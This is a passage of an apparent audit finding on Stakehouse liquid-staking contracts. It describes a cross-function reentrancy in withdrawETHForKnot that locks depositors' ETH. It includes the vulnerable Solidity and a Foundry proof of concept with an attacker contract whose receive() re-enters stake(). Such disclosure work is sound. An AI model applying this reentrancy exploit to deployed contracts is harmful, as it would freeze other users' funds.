  └──────────────────┘   │                        │Users cannot rotateTokens │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                           │                        │◄─────────────────────────┤</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                           │                        │                          │</span></span></code></pre>\n<p>Let’s assume the following starting point:</p>\n<ol>\n<li>Node runner registered and paid 4 ETH for BLS KEY <code>#1</code></li>\n<li>Node runner registered and paid 4 ETH for BLS KEY <code>#2</code></li>\n<li>savETH users collected 24 ETH ready for staking</li>\n<li>mevAndFess users collected 4 ETH ready for staking</li>\n</ol>\n<p><strong>Reentrancy in <code>withdrawETHForKnot</code></strong>:</p>\n<p><code>withdrawETHForKnot</code> is a function used in <code>LiquidStakingManager</code>. It is used to refund a node runner if funds are not yet staked and BAN the BLS key.</p>\n<p><code>withdrawETHForKnot</code>:<br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IOwnableSmartWallet(associatedSmartWallet).rawExecute(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _recipient,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            &quot;&quot;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            4 ether</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>The associatedSmartWallet will send the node runner 4 ETH (out of 8 currently in balance).</p>\n<p>Please note:</p>\n<ol>\n<li>The Node Runner can reenter the <code>LiquidStakingManager</code> when receiving the 4 ETH</li>\n<li><code>bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;</code> is only executed after the reentrancy</li>\n</ol>\n<p>We can call any method we need with the following states:</p>\n<ul>\n<li>BLS key is NOT banned</li>\n<li>Status is <code>IDataStructures.LifecycleStatus.INITIALS_REGISTERED</code></li>\n</ul>\n<p>The node runner will call the <code>stake</code> function to stake the deposited funds from the vaults and change the status to <code>IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE</code></p>\n<p><code>stake</code>:<br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function stake(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes[] calldata _blsPublicKeyOfKnots,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes[] calldata _ciphertexts,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes[] calldata _aesEncryptorKeys,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IDataStructures.EIP712Signature[] calldata _encryptionSignatures,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes32[] calldata _dataRoots</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // check if BLS public key is registered with liquid staking derivative network and not banned</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            require(isBLSPublicKeyBanned(blsPubKey) == false, &quot;BLS public key is banned or not a part of LSD network&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                &quot;Initials not registered&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _assertEtherIsReadyForValidatorStaking(blsPubKey);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _stake(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _blsPublicKeyOfKnots[i],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _ciphertexts[i],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _aesEncryptorKeys[i],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _encryptionSignatures[i],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _dataRoots[i]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>The <code>stake</code> function checks</p>\n<ol>\n<li>That the BLS key is not banned. In our case its not yet banned, because the banning happens after the reentrancy</li>\n<li>IDataStructures.LifecycleStatus.INITIALS_REGISTERED is the current Lifecycle status. Which it is.</li>\n<li>There is enough balance in the vaults and node runners smart wallet in <code>_assertEtherIsReadyForValidatorStaking</code></li>\n</ol>\n<p><code>_assertEtherIsReadyForValidatorStaking</code>  checks that the node runners smart wallet has more than 4 ETH.\nBecause our node runner has two BLS keys registered, there is an additional 4 ETH on BLS Key #2 and the conditions will pass.</p>\n<p><code>_assertEtherIsReadyForValidatorStaking</code><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address associatedSmartWallet = smartWalletOfKnot[blsPubKey];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(associatedSmartWallet.balance &gt;= 4 ether, &quot;Smart wallet balance must be at least 4 ether&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(address(stakingFundsLP) != address(0), &quot;No funds staked in staking funds vault&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(stakingFundsLP.totalSupply() == 4 ether, &quot;DAO staking funds vault balance must be at least 4 ether&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(address(savETHVaultLP) != address(0), &quot;No funds staked in savETH vault&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(savETHVaultLP.totalSupply() == 24 ether, &quot;KNOT must have 24 ETH in savETH vault&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>Since we can pass all checks. <code>_stake</code> will be called which withdraws all needed funds from the vault and executes a call through the smart wallet to the <code>TransactionRouter</code> with 32 ETH needed for the stake. The <code>TransactionRouter</code> will process the funds and stake them. The <code>LifecycleStatus</code> will be updated to <code>IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE</code></p>\n<p><code>_stake</code>:<br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L739\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L739</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _stake(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes calldata _blsPublicKey,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes calldata _cipherText,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes calldata _aesEncryptorKey,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IDataStructures.EIP712Signature calldata _encryptionSignature,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes32 dataRoot</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address smartWallet = smartWalletOfKnot[_blsPublicKey];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // send 24 ether from savETH vault to smart wallet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        savETHVault.withdrawETHForStaking(smartWallet, 24 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // send 4 ether from DAO staking funds vault</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        stakingFundsVault.withdrawETH(smartWallet, 4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // interact with transaction router using smart wallet to deposit 32 ETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IOwnableSmartWallet(smartWallet).execute(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            address(getTransactionRouter()),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            abi.encodeWithSelector(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                ITransactionRouter.registerValidator.selector,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                smartWallet,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _blsPublicKey,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _cipherText,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _aesEncryptorKey,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _encryptionSignature,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                dataRoot</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            ),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            32 ether</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>After <code>_stake</code> and <code>stake</code> will finish executing we will finish the Cross-Function Reentrancy.</p>\n<p>The protocol has entered the following state for the BLS key <code>#1</code>:</p>\n<ol>\n<li>BLS Key <code>#1</code> is banned</li>\n<li>LifecycleStatus is <code>IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE</code></li>\n</ol>\n<p>In such a state where the key is banned, no one can mint derivatives and therefor depositors cannot withdraw rewards/dETH:</p>\n<p><code>mintDerivatives</code>:<br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L577\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L577</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function mintDerivatives(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes[] calldata _blsPublicKeyOfKnots,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IDataStructures.ETH2DataReport[] calldata _beaconChainBalanceReports,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IDataStructures.EIP712Signature[] calldata _reportSignatures</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // check if BLS public key is registered and not banned</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            require(isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, &quot;BLS public key is banned or not a part of LSD network&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">....</span></span></code></pre>\n<p>Vault LP Tokens cannot be burned for withdraws because that is not supported in <code>DEPOSIT_COMPLETE</code> state:</p>\n<p><code>burnLPToken</code>:<br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SavETHVault.sol#L126\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SavETHVault.sol#L126</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function burnLPToken(LPToken _lpToken, uint256 _amount) public nonReentrant returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory blsPublicKeyOfKnot = KnotAssociatedWithLPToken[_lpToken];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IDataStructures.LifecycleStatus validatorStatus = getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfKnot);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            validatorStatus == IDataStructures.LifecycleStatus.INITIALS_REGISTERED ||</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            validatorStatus == IDataStructures.LifecycleStatus.TOKENS_MINTED,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            &quot;Cannot burn LP tokens&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">....</span></span></code></pre>\n<p>Tokens cannot be rotated to other LP tokens because that is not supported in a DEPOSIT_COMPLETE state</p>\n<p><code>rotateLPTokens</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory blsPublicKeyOfPreviousKnot = KnotAssociatedWithLPToken[_oldLPToken];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfPreviousKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            &quot;Lifecycle status must be one&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span></code></pre>\n<p>Funds are stuck, they cannot be taken or used.<br>\nThe LifecycleStatus is also stuck, tokens cannot be minted.</p>\n<h4 id=\"foundry-poc\" style=\"position:relative;\"><a href=\"#foundry-poc\" aria-label=\"foundry poc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Foundry POC</h4>\n<p>The POC will showcase the scenario in the diagram.</p>\n<p>Add the following contracts to <code>liquid-staking</code> folder:<br>\n<a href=\"https://github.com/coade-423n4/2022-11-stakehouse/tree/main/contracts/testing/liquid-staking\">https://github.com/coade-423n4/2022-11-stakehouse/tree/main/contracts/testing/liquid-staking</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// SPDX-License-Identifier: MIT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity 0.8.13;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { LiquidStakingManager } from &quot;../../liquid-staking/LiquidStakingManager.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { TestUtils } from &quot;../../../test/utils/TestUtils.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract NodeRunner {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes blsPublicKey1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    LiquidStakingManager manager;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    TestUtils testUtils;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    constructor(LiquidStakingManager _manager, bytes memory _blsPublicKey1, bytes memory _blsPublicKey2, address _testUtils) payable public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        manager = _manager;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        blsPublicKey1 = _blsPublicKey1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        testUtils = TestUtils(_testUtils);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //register BLS Key #1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        manager.registerBLSPublicKeys{ value: 4 ether }(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            testUtils.getBytesArrayFromBytes(blsPublicKey1),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            testUtils.getBytesArrayFromBytes(blsPublicKey1),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            address(0xdeadbeef)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Register BLS Key #2</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        manager.registerBLSPublicKeys{ value: 4 ether }(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            testUtils.getBytesArrayFromBytes(_blsPublicKey2),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            testUtils.getBytesArrayFromBytes(_blsPublicKey2),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            address(0xdeadbeef)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    receive() external payable {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        testUtils.stakeSingleBlsPubKey(blsPublicKey1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Add the following imports to <code>LiquidStakingManager.t.sol</code><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">import { NodeRunner } from &quot;../../contracts/testing/liquid-staking/NodeRunner.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { IDataStructures } from &quot;@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol&quot;;</span></span></code></pre>\n<p>Add the following test to <code>LiquidStakingManager.t.sol</code><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L121\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L121</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function testLockStakersFunds() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 startAmount = 8 ether;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Create NodeRunner. Constructor registers two BLS Keys</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address nodeRunner = address(new NodeRunner{value: startAmount}(manager, blsPubKeyOne, blsPubKeyTwo, address(this)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Simulate state transitions in lifecycle status to initials registered (value of 1)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // savETHUser, feesAndMevUser funds used to deposit into validator BLS key #1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // deposit savETHUser, feesAndMevUser funds for validator #1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        depositIntoDefaultSavETHVault(savETHUser, blsPubKeyOne, 24 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        depositIntoDefaultStakingFundsVault(feesAndMevUser, blsPubKeyOne, 4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // withdraw ETH for first BLS key and reenter</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // This will perform a cross-function reentracy to call stake</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(nodeRunner);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        manager.withdrawETHForKnot(nodeRunner, blsPubKeyOne);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Simulate state transitions in lifecycle status to ETH deposited (value of 2)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // In real deployment, when stake is called TransactionRouter.registerValidator is called to change the state to DEPOSIT_COMPLETE </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Validate mintDerivatives reverts because of banned public key </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (,IDataStructures.ETH2DataReport[] memory reports) = getFakeBalanceReport();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (,IDataStructures.EIP712Signature[] memory sigs) = getFakeEIP712Signature();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.expectRevert(&quot;BLS public key is banned or not a part of LSD network&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        manager.mintDerivatives(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            getBytesArrayFromBytes(blsPubKeyOne),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            reports,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            sigs</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Validate depositor cannot burn LP tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(savETHUser);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.expectRevert(&quot;Cannot burn LP tokens&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        savETHVault.burnLPTokensByBLS(getBytesArrayFromBytes(blsPubKeyOne), getUint256ArrayFromValues(24 ether));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>To run the POC execute: <code>yarn test -m testLockStakersFunds -v</code></p>\n<p>Expected output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] testLockStakersFunds() (gas: 1731537)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Test result: ok. 1 passed; 0 failed; finished in 8.21ms</span></span></code></pre>\n<p>To see the full trace, execute: <code>yarn test -m testLockStakersFunds -vvvv</code></p>\n<h3 id=\"tools-used-8\" style=\"position:relative;\"><a href=\"#tools-used-8\" aria-label=\"tools used 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 